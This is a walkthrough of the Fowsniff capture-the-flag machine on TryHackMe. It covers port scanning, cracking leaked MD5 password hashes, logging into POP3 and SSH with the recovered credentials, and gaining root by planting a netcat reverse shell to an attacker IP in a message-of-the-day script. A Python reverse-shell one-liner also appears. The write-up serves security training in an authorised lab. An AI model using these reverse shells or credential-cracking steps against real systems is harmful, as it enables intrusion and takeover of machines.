# Fowsniff CTF

#### Hack this machine and get the flag. There are lots of hints along the way and is perfect for beginners!

## Task 1 Hack into the FowSniff organisation.

<p>This boot2root machine is brilliant for new starters. You will have to enumerate this machine by finding open ports, do some online research (its amazing how much information Google can find for you), decoding hashes, brute forcing a pop3 login and much more!</p>

<p>This will be structured to go through what you need to do, step by step. Make sure you are connected to TryHackMe network</p>

<p>Credit to berzerk0 for creating this machine. This machine is used here with the explicit permission of the creator. </p>

```
1. Deploy the machine. On the top right of this you will see a Deploy button. Click on this to deploy the machine into the cloud. Wait a minute for it to become live.
Ans: No Answer Needed.

2. Using nmap, scan this machine. What ports are open?
Ans: No Answer Needed.

```

<p>Lets Scan Machine</p>
<br/>

```
# Nmap 7.60 scan initiated Fri Aug 13 16:52:08 2021 as: nmap -sC -sV -oN Desktop/nmap.txt 10.10.223.102
Nmap scan report for ip-10-10-223-102.eu-west-1.compute.internal (10.10.223.102)
Host is up (0.054s latency).
Not shown: 946 closed ports, 50 filtered ports
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 90:35:66:f4:c6:d2:95:12:1b:e8:cd:de:aa:4e:03:23 (RSA)
|   256 53:9d:23:67:34:cf:0a:d5:5a:9a:11:74:bd:fd:de:71 (ECDSA)
|_  256 a2:8f:db:ae:9e:3d:c9:e6:a9:ca:03:b1:d7:1b:66:83 (EdDSA)
80/tcp  open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry
|_/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Fowsniff Corp - Delivering Solutions
110/tcp open  pop3    Dovecot pop3d
|_pop3-capabilities: RESP-CODES SASL(PLAIN) USER AUTH-RESP-CODE CAPA UIDL TOP PIPELINING
143/tcp open  imap    Dovecot imapd
|_imap-capabilities: LITERAL+ AUTH=PLAINA0001 OK SASL-IR have listed more ENABLE capabilities post-login IMAP4rev1 Pre-login LOGIN-REFERRALS ID IDLE
MAC Address: 02:21:7D:6F:4D:67 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Aug 13 16:52:17 2021 -- 1 IP address (1 host up) scanned in 10.00 seconds
```

<p>Lets also scan machine with Nikto</p>

```
- Nikto v2.1.5/2.1.5
+ Target Host: ip-10-10-223-102.eu-west-1.compute.internal
+ Target Port: 80
+ GET /: Server leaks inodes via ETags, header found with file /, fields: 0xa45 0x5674fd157f6d0
+ GET /: The anti-clickjacking X-Frame-Options header is not present.
+ GET //: File/dir '/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ GET /robots.txt: "robots.txt" contains 1 entry which should be manually viewed.
+ GET /images: IP address found in the 'location' header. The IP is "127.0.1.1".
+ -630: GET /images: IIS may reveal its internal or real IP in the Location header via a request to the /images directory. The value is "http://127.0.1.1/images/".
+ OPTIONS /: Allowed HTTP Methods: OPTIONS, GET, HEAD, POST
+ -3268: GET /images/: /images/: Directory indexing found.
+ -3268: GET /images/?pattern=/etc/*&sort=name: /images/?pattern=/etc/*&sort=name: Directory indexing found.
+ -3092: GET /LICENSE.txt: /LICENSE.txt: License file found may identify site software.
+ -3233: GET /icons/README: /icons/README: Apache default file found.
```

```
3. Using the information from the open ports. Look around. What can you find?
Ans: No Answer Needed.

```

<p>Lets Check each port One by One, First We will Check Web Server Port.</p>
<p>We can see robots.txt in Nikto Scan Result lets Check it.</p>

![Robots.txt](https://github.com/vrbait1107/CTF_WRITEUPS/blob/main/TryHackMe/images/Fowsniff-CTF/Picture-1.png "Robots.txt")

<p>Nothing Interesting in Robots.txt Lets brute force directory with Gobuster</p>

```
/images (Status: 301)
/assets (Status: 301)
/server-status (Status: 403)

```

![Directory Listing](https://github.com/vrbait1107/CTF_WRITEUPS/blob/main/TryHackMe/images/Fowsniff-CTF/Picture-2.png "Directory Listing")

<p>Again, Nothing interesting in this files, Lets Check Home Page. </p>

![Home Page](https://github.com/vrbait1107/CTF_WRITEUPS/blob/main/TryHackMe/images/Fowsniff-CTF/Picture-3.png "Home Page")

```
Fowsniff's internal system suffered a data breach that resulted in the exposure of employee usernames and passwords.

Client information was not affected.

Due to the strong possibility that employee information has been made publicly available, all employees have been instructed to change their passwords immediately.

The attackers were also able to hijack our official @fowsniffcorp Twitter account. All of our official tweets have been deleted and the attackers may release sensitive information via this medium. We are working to resolve this at soon as possible.

We will return to full capacity after a service upgrade.

```

<p>We can see The attackers were also able to hijack our official @fowsniffcorp Twitter account. so Lets Check their twitter account.</p>

Visit Twitter Account [fowsniffcorp twiiter account](https://twitter.com/fowsniffcorp)

![Twitter Account](https://github.com/vrbait1107/CTF_WRITEUPS/blob/main/TryHackMe/images/Fowsniff-CTF/Picture-4.png "Twitter Account")

<p>By Checking Twitter Account We found Link of pastebin.</p>

Visit Pastebin [Pastebin Link](https://pastebin.com/NrAqVeeX)

```

FOWSNIFF CORP PASSWORD LEAK
''~``
( o o )
+-----.oooO--(_)--Oooo.------+
| |
| FOWSNIFF |
| got |
| PWN3D!!! |
| |
| .oooO |
| ( ) Oooo. |
+---------\ (----( )-------+
\_) ) /
(_/
FowSniff Corp got pwn3d by B1gN1nj4!
No one is safe from my 1337 skillz!

mauer@fowsniff:8a28a94a588a95b80163709ab4313aa4
mustikka@fowsniff:ae1644dac5b77c0cf51e0d26ad6d7e56
tegel@fowsniff:1dc352435fecca338acfd4be10984009
baksteen@fowsniff:19f5af754c31f1e2651edde9250d69bb
seina@fowsniff:90dc16d47114aa13671c697fd506cf26
stone@fowsniff:a92b8a29ef1183192e3d35187e0cfabd
mursten@fowsniff:0e9588cb62f4b6f27e33d449e2ba0b3b
parede@fowsniff:4d6e42f56e127803285a0a7649b5ab11
sciana@fowsniff:f7fd98d380735e859f8b2ffbbede5a7e

Fowsniff Corporation Passwords LEAKED!
FOWSNIFF CORP PASSWORD DUMP!

Here are their email passwords dumped from their databases.
They left their pop3 server WIDE OPEN, too!

MD5 is insecure, so you shouldn't have trouble cracking them but I was too lazy haha =P

l8r n00bz!

B1gN1nj4

---

This list is entirely fictional and is part of a Capture the Flag educational challenge.

All information contained within is invented solely for this purpose and does not correspond
to any real persons or organizations.

Any similarities to actual people or entities is purely coincidental and occurred accidentally.

```

```
4. Using Google, can you find any public information about them?
Ans: No Answer Nedded.

5. Can you decode these md5 hashes? You can even use sites like hashkiller to decode them.
Ans: No Answer Needed.

```

<p>We got passwords hashesh. Lets Crack it using Crackstation.net</p>

![Password Cracking](https://github.com/vrbait1107/CTF_WRITEUPS/blob/main/TryHackMe/images/Fowsniff-CTF/Picture-5.png "Password Cracking")

```
mauer@fowsniff:8a28a94a588a95b80163709ab4313aa4 --> mailcall
mustikka@fowsniff:ae1644dac5b77c0cf51e0d26ad6d7e56 --> bilbo101
tegel@fowsniff:1dc352435fecca338acfd4be10984009 --> apples01
baksteen@fowsniff:19f5af754c31f1e2651edde9250d69bb --> skyler22
seina@fowsniff:90dc16d47114aa13671c697fd506cf26 --> scoobydoo2
stone@fowsniff:a92b8a29ef1183192e3d35187e0cfabd --> Not Found
mursten@fowsniff:0e9588cb62f4b6f27e33d449e2ba0b3b --> carp4ever
parede@fowsniff:4d6e42f56e127803285a0a7649b5ab11 --> orlando12
sciana@fowsniff:f7fd98d380735e859f8b2ffbbede5a7e --> 07011972

```

```
6. Using the usernames and passwords you captured, can you use metasploit to brute force the pop3 login?
Ans: No Answer Needed.

7. What was seina's password to the email service?
Ans: scoobydoo2

8. Can you connect to the pop3 service with her credentials? What email information can you gather?
Ans: No Answer Needed.

```

<p>We got Credentials for pop3 seina:scoobydoo2</p>
<p> Lets Connect POP3 Service on port 110 using Netcat.</p>

**Restarted Machine**

```

someone@SOMETHING-PC MINGW32 /
$ ncat 10.10.234.29 110

someone@SOMETHING-PC MINGW32 /
$ ncat 10.10.243.29 110
+OK Welcome to the Fowsniff Corporate Mail Server!
user seina
+OK
pass scoobydoo2
+OK Logged in.
list
+OK 2 messages:
1 1622
2 1280
.
retr 1
+OK 1622 octets
Return-Path: <stone@fowsniff>
X-Original-To: seina@fowsniff
Delivered-To: seina@fowsniff
Received: by fowsniff (Postfix, from userid 1000)
id 0FA3916A; Tue, 13 Mar 2018 14:51:07 -0400 (EDT)
To: baksteen@fowsniff, mauer@fowsniff, mursten@fowsniff,
mustikka@fowsniff, parede@fowsniff, sciana@fowsniff, seina@fowsniff,
tegel@fowsniff
Subject: URGENT! Security EVENT!
Message-Id: <20180313185107.0FA3916A@fowsniff>
Date: Tue, 13 Mar 2018 14:51:07 -0400 (EDT)
From: stone@fowsniff (stone)
X-Antivirus: Avast (VPS 210813-8, 13-8-2021), Inbound message
X-Antivirus-Status: Clean

Dear All,

A few days ago, a malicious actor was able to gain entry to
our internal email systems. The attacker was able to exploit
incorrectly filtered escape characters within our SQL database
to access our login credentials. Both the SQL and authentication
system used legacy methods that had not been updated in some time.

We have been instructed to perform a complete internal system
overhaul. While the main systems are "in the shop," we have
moved to this isolated, temporary server that has minimal
functionality.

This server is capable of sending and receiving emails, but only
locally. That means you can only send emails to other users, not
to the world wide web. You can, however, access this system via
the SSH protocol.

The temporary password for SSH is "S1ck3nBluff+secureshell"

You MUST change this password as soon as possible, and you will do so under my
guidance. I saw the leak the attacker posted online, and I must say that your
passwords were not very secure.

Come see me in my office at your earliest convenience and we'll set it up.

Thanks,
A.J Stone

.

retr 2
+OK 1280 octets
Return-Path: <baksteen@fowsniff>
X-Original-To: seina@fowsniff
Delivered-To: seina@fowsniff
Received: by fowsniff (Postfix, from userid 1004)
id 101CA1AC2; Tue, 13 Mar 2018 14:54:05 -0400 (EDT)
To: seina@fowsniff
Subject: You missed out!
Message-Id: <20180313185405.101CA1AC2@fowsniff>
Date: Tue, 13 Mar 2018 14:54:05 -0400 (EDT)
From: baksteen@fowsniff
X-Antivirus: Avast (VPS 210813-8, 13-8-2021), Inbound message
X-Antivirus-Status: Clean

Devin,

You should have seen the brass lay into AJ today!
We are going to be talking about this one for a looooong time hahaha.
Who knew the regional manager had been in the navy? She was swearing like a sailor!

I don't know what kind of pneumonia or something you brought back with
you from your camping trip, but I think I'm coming down with it myself.
How long have you been gone - a week?
Next time you're going to get sick and miss the managerial blowout of the century,
at least keep it to yourself!

I'm going to head home early and eat some chicken soup.
I think I just got an email from Stone, too, but it's probably just some
"Let me explain the tone of my meeting with management" face-saving mail.
I'll read it when I get back.

Feel better,

Skyler

PS: Make sure you change your email password.
AJ had been telling us to do that right before Captain Profanity showed up.

.

```

<p>By Checking Email We found temporary password.</p>

```
9. Looking through her emails, what was a temporary password set for her?
Ans: S1ck3nBluff+secureshell

10. In the email, who send it? Using the password from the previous question and the senders username, connect to the machine using SSH.
Ans: No Answer Needed.

```

<p>Lets Connect SSH with baksteen:S1ck3nBluff+secureshell </p>

```
$ ssh baksteen@10.10.243.29
baksteen@10.10.243.29's password:

                            _____                       _  __  __
      :sdddddddddddddddy+  |  ___|____      _____ _ __ (_)/ _|/ _|

:yNMMMMMMMMMMMMMNmhsso | |_ / _ \ \ /\ / / **| '_ \| | |_| |_
.sdmmmmmNmmmmmmmNdyssssso | _| (\_) \ V V /\__ \ | | | | _| _|
-: y. dssssssso |_| \_**/ \_/\_/ |**_/_| |_|_|_| |_|
-: y. dssssssso \_\_**
-: y. dssssssso / **_|_** _ \_\_ _ **
-: y. dssssssso | | / \_ \| '**| '_ \
-: o. dssssssso | |\_\_| (_) | | | |_) | _
-: o. yssssssso \_**\_\_**/|_| | .\_\_/ (_)
-: .+mdddddddmyyyyyhy: |\_|
-: -odMMMMMMMMMMmhhdy/.
.ohdddddddddddddho: Delivering Solutions

\***\* Welcome to the Fowsniff Corporate Server! \*\***

              ---------- NOTICE: ----------

- Due to the recent security breach, we are running on a very minimal system.
- Contact AJ Stone -IMMEDIATELY- about changing your email and SSH passwords.

Last login: Tue Mar 13 16:55:40 2018 from 192.168.7.36
baksteen@fowsniff:~$

```

```
11. Once connected, what groups does this user belong to? Are there any interesting files that can be run by that group?
Ans: No Anwer Needed.

```

<p>Lets Check what groups does this user belong to? Are there any interesting files that can be run by that group.?</p>

```

baksteen@fowsniff:~$ id
uid=1004(baksteen) gid=100(users) groups=100(users),1001(baksteen)

baksteen@fowsniff:~$ find / -group users -type f 2>/dev/null
/opt/cube/cube.sh
/home/baksteen/.cache/motd.legal-displayed
/home/baksteen/Maildir/dovecot-uidvalidity
/home/baksteen/Maildir/dovecot.index.log
/home/baksteen/Maildir/new/1520967067.V801I23764M196461.fowsniff
/home/baksteen/Maildir/dovecot-uidlist
/home/baksteen/Maildir/dovecot-uidvalidity.5aa21fac
/home/baksteen/.viminfo
/home/baksteen/.bash_history
/home/baksteen/.lesshsQ
/home/baksteen/.bash_logout
/home/baksteen/term.txt
/home/baksteen/.profile
/home/baksteen/.bashrc
/sys/fs/cgroup/systemd/user.slice/user-1004.slice/user@1004.service/tasks
/sys/fs/cgroup/systemd/user.slice/user-1004.slice/user@1004.service/cgroup.procs
/sys/fs/cgroup/systemd/user.slice/user-1004.slice/user@1004.service/init.scope/tasks
/sys/fs/cgroup/systemd/user.slice/user-1004.slice/user@1004.service/init.scope/cgroup.procs
/sys/fs/cgroup/systemd/user.slice/user-1004.slice/user@1004.service/init.scope/cgroup.clone_children
/sys/fs/cgroup/systemd/user.slice/user-1004.slice/user@1004.service/init.scope/notify_on_release
/proc/1026/task/1026/fdinfo/0
/proc/1026/task/1026/fdinfo/1
/proc/1026/task/1026/fdinfo/2
/proc/1026/task/1026/fdinfo/3
/proc/1026/task/1026/fdinfo/4
/proc/1026/task/1026/fdinfo/5
/proc/1026/task/1026/fdinfo/6
/proc/1026/task/1026/fdinfo/7
/proc/1026/task/1026/fdinfo/8
/proc/1026/task/1026/fdinfo/9
/proc/1026/task/1026/fdinfo/10
/proc/1026/task/1026/fdinfo/11
/proc/1026/task/1026/fdinfo/12
/proc/1026/task/1026/fdinfo/13
/proc/1026/task/1026/fdinfo/14
/proc/1026/task/1026/environ
/proc/1026/task/1026/auxv
/proc/1026/task/1026/status
/proc/1026/task/1026/personality
/proc/1026/task/1026/limits
/proc/1026/task/1026/sched
/proc/1026/task/1026/comm
/proc/1026/task/1026/syscall
/proc/1026/task/1026/cmdline
/proc/1026/task/1026/stat
/proc/1026/task/1026/statm
/proc/1026/task/1026/maps
/proc/1026/task/1026/children
/proc/1026/task/1026/numa_maps
/proc/1026/task/1026/mem
/proc/1026/task/1026/mounts
/proc/1026/task/1026/mountinfo
/proc/1026/task/1026/clear_refs
/proc/1026/task/1026/smaps
/proc/1026/task/1026/pagemap
/proc/1026/task/1026/attr/current
/proc/1026/task/1026/attr/prev
/proc/1026/task/1026/attr/exec
/proc/1026/task/1026/attr/fscreate
/proc/1026/task/1026/attr/keycreate
/proc/1026/task/1026/attr/sockcreate
/proc/1026/task/1026/wchan
/proc/1026/task/1026/stack
/proc/1026/task/1026/schedstat
/proc/1026/task/1026/cpuset
/proc/1026/task/1026/cgroup
/proc/1026/task/1026/oom_score
/proc/1026/task/1026/oom_adj
/proc/1026/task/1026/oom_score_adj
/proc/1026/task/1026/loginuid
/proc/1026/task/1026/sessionid
/proc/1026/task/1026/io
/proc/1026/task/1026/uid_map
/proc/1026/task/1026/gid_map
/proc/1026/task/1026/projid_map
/proc/1026/task/1026/setgroups
/proc/1026/fdinfo/0
/proc/1026/fdinfo/1
/proc/1026/fdinfo/2
/proc/1026/fdinfo/3
/proc/1026/fdinfo/4
/proc/1026/fdinfo/5
/proc/1026/fdinfo/6
/proc/1026/fdinfo/7
/proc/1026/fdinfo/8
/proc/1026/fdinfo/9
/proc/1026/fdinfo/10
/proc/1026/fdinfo/11
/proc/1026/fdinfo/12
/proc/1026/fdinfo/13
/proc/1026/fdinfo/14
/proc/1026/environ
/proc/1026/auxv
/proc/1026/status
/proc/1026/personality
/proc/1026/limits
/proc/1026/sched
/proc/1026/autogroup
/proc/1026/comm
/proc/1026/syscall
/proc/1026/cmdline
/proc/1026/stat
/proc/1026/statm
/proc/1026/maps
/proc/1026/numa_maps
/proc/1026/mem
/proc/1026/mounts
/proc/1026/mountinfo
/proc/1026/mountstats
/proc/1026/clear_refs
/proc/1026/smaps
/proc/1026/pagemap
/proc/1026/attr/current
/proc/1026/attr/prev
/proc/1026/attr/exec
/proc/1026/attr/fscreate
/proc/1026/attr/keycreate
/proc/1026/attr/sockcreate
/proc/1026/wchan
/proc/1026/stack
/proc/1026/schedstat
/proc/1026/cpuset
/proc/1026/cgroup
/proc/1026/oom_score
/proc/1026/oom_adj
/proc/1026/oom_score_adj
/proc/1026/loginuid
/proc/1026/sessionid
/proc/1026/coredump_filter
/proc/1026/io
/proc/1026/uid_map
/proc/1026/gid_map
/proc/1026/projid_map
/proc/1026/setgroups
/proc/1026/timers
/proc/1053/task/1053/fdinfo/0
/proc/1053/task/1053/fdinfo/1
/proc/1053/task/1053/fdinfo/2
/proc/1053/task/1053/fdinfo/255
/proc/1053/task/1053/environ
/proc/1053/task/1053/auxv
/proc/1053/task/1053/status
/proc/1053/task/1053/personality
/proc/1053/task/1053/limits
/proc/1053/task/1053/sched
/proc/1053/task/1053/comm
/proc/1053/task/1053/syscall
/proc/1053/task/1053/cmdline
/proc/1053/task/1053/stat
/proc/1053/task/1053/statm
/proc/1053/task/1053/maps
/proc/1053/task/1053/children
/proc/1053/task/1053/numa_maps
/proc/1053/task/1053/mem
/proc/1053/task/1053/mounts
/proc/1053/task/1053/mountinfo
/proc/1053/task/1053/clear_refs
/proc/1053/task/1053/smaps
/proc/1053/task/1053/pagemap
/proc/1053/task/1053/attr/current
/proc/1053/task/1053/attr/prev
/proc/1053/task/1053/attr/exec
/proc/1053/task/1053/attr/fscreate
/proc/1053/task/1053/attr/keycreate
/proc/1053/task/1053/attr/sockcreate
/proc/1053/task/1053/wchan
/proc/1053/task/1053/stack
/proc/1053/task/1053/schedstat
/proc/1053/task/1053/cpuset
/proc/1053/task/1053/cgroup
/proc/1053/task/1053/oom_score
/proc/1053/task/1053/oom_adj
/proc/1053/task/1053/oom_score_adj
/proc/1053/task/1053/loginuid
/proc/1053/task/1053/sessionid
/proc/1053/task/1053/io
/proc/1053/task/1053/uid_map
/proc/1053/task/1053/gid_map
/proc/1053/task/1053/projid_map
/proc/1053/task/1053/setgroups
/proc/1053/fdinfo/0
/proc/1053/fdinfo/1
/proc/1053/fdinfo/2
/proc/1053/fdinfo/255
/proc/1053/environ
/proc/1053/auxv
/proc/1053/status
/proc/1053/personality
/proc/1053/limits
/proc/1053/sched
/proc/1053/autogroup
/proc/1053/comm
/proc/1053/syscall
/proc/1053/cmdline
/proc/1053/stat
/proc/1053/statm
/proc/1053/maps
/proc/1053/numa_maps
/proc/1053/mem
/proc/1053/mounts
/proc/1053/mountinfo
/proc/1053/mountstats
/proc/1053/clear_refs
/proc/1053/smaps
/proc/1053/pagemap
/proc/1053/attr/current
/proc/1053/attr/prev
/proc/1053/attr/exec
/proc/1053/attr/fscreate
/proc/1053/attr/keycreate
/proc/1053/attr/sockcreate
/proc/1053/wchan
/proc/1053/stack
/proc/1053/schedstat
/proc/1053/cpuset
/proc/1053/cgroup
/proc/1053/oom_score
/proc/1053/oom_adj
/proc/1053/oom_score_adj
/proc/1053/loginuid
/proc/1053/sessionid
/proc/1053/coredump_filter
/proc/1053/io
/proc/1053/uid_map
/proc/1053/gid_map
/proc/1053/projid_map
/proc/1053/setgroups
/proc/1053/timers
/proc/1095/task/1095/fdinfo/0
/proc/1095/task/1095/fdinfo/1
/proc/1095/task/1095/fdinfo/2
/proc/1095/task/1095/fdinfo/3
/proc/1095/task/1095/fdinfo/4
/proc/1095/task/1095/fdinfo/5
/proc/1095/task/1095/fdinfo/7
/proc/1095/task/1095/fdinfo/8
/proc/1095/task/1095/fdinfo/9
/proc/1095/task/1095/fdinfo/10
/proc/1095/task/1095/environ
/proc/1095/task/1095/auxv
/proc/1095/task/1095/status
/proc/1095/task/1095/personality
/proc/1095/task/1095/limits
/proc/1095/task/1095/sched
/proc/1095/task/1095/comm
/proc/1095/task/1095/syscall
/proc/1095/task/1095/cmdline
/proc/1095/task/1095/stat
/proc/1095/task/1095/statm
/proc/1095/task/1095/maps
/proc/1095/task/1095/children
/proc/1095/task/1095/numa_maps
/proc/1095/task/1095/mem
/proc/1095/task/1095/mounts
/proc/1095/task/1095/mountinfo
/proc/1095/task/1095/clear_refs
/proc/1095/task/1095/smaps
/proc/1095/task/1095/pagemap
/proc/1095/task/1095/attr/current
/proc/1095/task/1095/attr/prev
/proc/1095/task/1095/attr/exec
/proc/1095/task/1095/attr/fscreate
/proc/1095/task/1095/attr/keycreate
/proc/1095/task/1095/attr/sockcreate
/proc/1095/task/1095/wchan
/proc/1095/task/1095/stack
/proc/1095/task/1095/schedstat
/proc/1095/task/1095/cpuset
/proc/1095/task/1095/cgroup
/proc/1095/task/1095/oom_score
/proc/1095/task/1095/oom_adj
/proc/1095/task/1095/oom_score_adj
/proc/1095/task/1095/loginuid
/proc/1095/task/1095/sessionid
/proc/1095/task/1095/io
/proc/1095/task/1095/uid_map
/proc/1095/task/1095/gid_map
/proc/1095/task/1095/projid_map
/proc/1095/task/1095/setgroups
/proc/1095/fdinfo/0
/proc/1095/fdinfo/1
/proc/1095/fdinfo/2
/proc/1095/fdinfo/3
/proc/1095/fdinfo/4
/proc/1095/fdinfo/6
/proc/1095/fdinfo/7
/proc/1095/environ
/proc/1095/auxv
/proc/1095/status
/proc/1095/personality
/proc/1095/limits
/proc/1095/sched
/proc/1095/autogroup
/proc/1095/comm
/proc/1095/syscall
/proc/1095/cmdline
/proc/1095/stat
/proc/1095/statm
/proc/1095/maps
/proc/1095/numa_maps
/proc/1095/mem
/proc/1095/mounts
/proc/1095/mountinfo
/proc/1095/mountstats
/proc/1095/clear_refs
/proc/1095/smaps
/proc/1095/pagemap
/proc/1095/attr/current
/proc/1095/attr/prev
/proc/1095/attr/exec
/proc/1095/attr/fscreate
/proc/1095/attr/keycreate
/proc/1095/attr/sockcreate
/proc/1095/wchan
/proc/1095/stack
/proc/1095/schedstat
/proc/1095/cpuset
/proc/1095/cgroup
/proc/1095/oom_score
/proc/1095/oom_adj
/proc/1095/oom_score_adj
/proc/1095/loginuid
/proc/1095/sessionid
/proc/1095/coredump_filter
/proc/1095/io
/proc/1095/uid_map
/proc/1095/gid_map
/proc/1095/projid_map
/proc/1095/setgroups
/proc/1095/timers
baksteen@fowsniff:~$

```

<p>We got this interesting file.</p>

```
/opt/cube/cube.sh
```

<p>Lets Check this file.</p>

```
baksteen@fowsniff:/opt$ cd /opt/cube
baksteen@fowsniff:/opt/cube$ ls -la
total 12
drwxrwxrwx 2 root root 4096 Mar 11 2018 .
drwxr-xr-x 6 root root 4096 Mar 11 2018 ..
-rw-rwxr-- 1 parede users 851 Mar 11 2018 cube.sh
baksteen@fowsniff:/opt/cube$ cat cube.sh
printf "
**\_** \_ \_\_ **
:sdddddddddddddddy+ | \_**|\_**\_ \_\_\_** _ \_\_ (_)/ _|/ _|
:yNMMMMMMMMMMMMMNmhsso | |_ / _ \ \ /\ / / **| '_ \| | |_| |_
.sdmmmmmNmmmmmmmNdyssssso | _| (\_) \ V V /\__ \ | | | | _| _|
-: y. dssssssso |_| \_**/ \_/\_/ |**_/_| |_|_|_| |_|
-: y. dssssssso \_\_**
-: y. dssssssso / **_|_** _ \_\_ _ **
-: y. dssssssso | | / \_ \| '**| '_ \
-: o. dssssssso | |\_\_| (_) | | | |_) | _
-: o. yssssssso \_**\_\_**/|_| | .\_\_/ (_)
-: .+mdddddddmyyyyyhy: |\_|
-: -odMMMMMMMMMMmhhdy/.
.ohdddddddddddddho: Delivering Solutions\n\n"

baksteen@fowsniff:/opt/cube$

```

```
Now you have found a file that can be edited by the group, can you edit it to include a reverse shell?

Python Reverse Shell:

python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<IP>,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

12. Other reverse shells: here.

Ans: No Answer Needed.

13. If you have not found out already, this file is run as root when a user connects to the machine using SSH. We know this as when we first connect we can see we get given a banner (with fowsniff corp). Look in /etc/update-motd.d/ file. If (after we have put our reverse shell in the cube file) we then include this file in the motd.d file, it will run as root and we will get a reverse shell as root!

Ans: No Answers Needed.

14. Start a netcat listener (nc -lvp 1234) and then re-login to the SSH service. You will then receive a reverse shell on your netcat session as root!
Ans: No Answer Needed.

15. If you are really really stuck, there is a brilliant walkthrough here: https://www.hackingarticles.in/fowsniff-1-vulnhub-walkthrough/

If its easier, follow this walkthrough with the deployed machine on the site.

Ans: No Answer Needed.


```

<p>This file run when we login so that means we can get reverse shell as root.</p>
<p>I have used netcat reverse shell, you can use python or any other reverse shell.</p>

```

printf "
**\_** \_ \_\_ **
:sdddddddddddddddy+ | \_**|\_**\_ \_\_\_** _ \_\_ (_)/ _|/ _|
:yNMMMMMMMMMMMMMNmhsso | |_ / _ \ \ /\ / / **| '_ \| | |_| |_
.sdmmmmmNmmmmmmmNdyssssso | _| (\_) \ V V /\__ \ | | | | _| _|
-: y. dssssssso |_| \_**/ \_/\_/ |**_/_| |_|_|_| |_|
-: y. dssssssso \_\_**
-: y. dssssssso / **_|_** _ \_\_ _ **
-: y. dssssssso | | / \_ \| '**| '_ \
-: o. dssssssso | |\_\_| (_) | | | |_) | _
-: o. yssssssso \_**\_\_**/|_| | .\_\_/ (_)
-: .+mdddddddmyyyyyhy: |\_|
-: -odMMMMMMMMMMmhhdy/.
.ohdddddddddddddho: Delivering Solutions\n\n"

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.2.242 1234 >/tmp/f

```

<p>Lets set listener on port 1234 in our Local Machine.</p>
<p>Now we got the shell as root.</p>

```

someone@SOMETHING MINGW32 ~/Desktop
$ ncat -lvnp 1234
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
Ncat: Connection from 10.10.243.29.
Ncat: Connection from 10.10.243.29:58328.
/bin/sh: 0: can't access tty; job control turned off

# which python3

/usr/bin/python3

# python3 -c 'import pty;pty.spawn("/bin/bash")'

root@fowsniff:/# ls -la
ls -la
total 96
drwxr-xr-x 22 root root 4096 Mar 9 2018 .
drwxr-xr-x 22 root root 4096 Mar 9 2018 ..
-rw------- 1 root root 5 Mar 9 2018 .bash_history
-rw------- 1 root root 251 Mar 9 2018 .lesshst
-rw------- 1 root root 575 Mar 9 2018 .viminfo
drwxr-xr-x 2 root root 4096 Mar 8 2018 bin
drwxr-xr-x 3 root root 4096 Mar 8 2018 boot
drwxr-xr-x 18 root root 3720 Aug 14 01:45 dev
drwxr-xr-x 87 root root 4096 Dec 9 2018 etc
drwxr-xr-x 11 root root 4096 Mar 8 2018 home
lrwxrwxrwx 1 root root 33 Mar 8 2018 initrd.img -> boot/initrd.img-4.4.0-116-generic
drwxr-xr-x 19 root root 4096 Mar 8 2018 lib
drwxr-xr-x 2 root root 4096 Mar 8 2018 lib64
drwx------ 2 root root 16384 Mar 8 2018 lost+found
drwxr-xr-x 2 root root 4096 Mar 8 2018 media
drwxr-xr-x 2 root root 4096 Mar 8 2018 mnt
drwxr-xr-x 6 root root 4096 Mar 11 2018 opt
dr-xr-xr-x 113 root root 0 Aug 14 01:44 proc
drwx------ 4 root root 4096 Mar 9 2018 root
drwxr-xr-x 21 root root 620 Aug 14 02:48 run
drwxr-xr-x 2 root root 4096 Mar 8 2018 sbin
drwxr-xr-x 2 root root 4096 Mar 8 2018 srv
dr-xr-xr-x 13 root root 0 Aug 14 01:45 sys
drwxrwxrwt 9 root root 4096 Aug 14 02:48 tmp
drwxr-xr-x 10 root root 4096 Mar 8 2018 usr
drwxr-xr-x 12 root root 4096 Mar 8 2018 var
lrwxrwxrwx 1 root root 30 Mar 8 2018 vmlinuz -> boot/vmlinuz-4.4.0-116-generic
root@fowsniff:/#

```

### Extra Enumeration: LINPEAS ENUMERATION

```

baksteen@fowsniff:~$ chmod +x linpeas.sh
baksteen@fowsniff:~$ ./linpeas.sh

                     ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
             ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄

▄▄▄▄ ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄
▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄ ▄▄▄▄▄▄ ▄
▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄ ▄▄▄▄
▄▄ ▄▄▄ ▄▄▄▄▄ ▄▄▄
▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄
▄ ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄
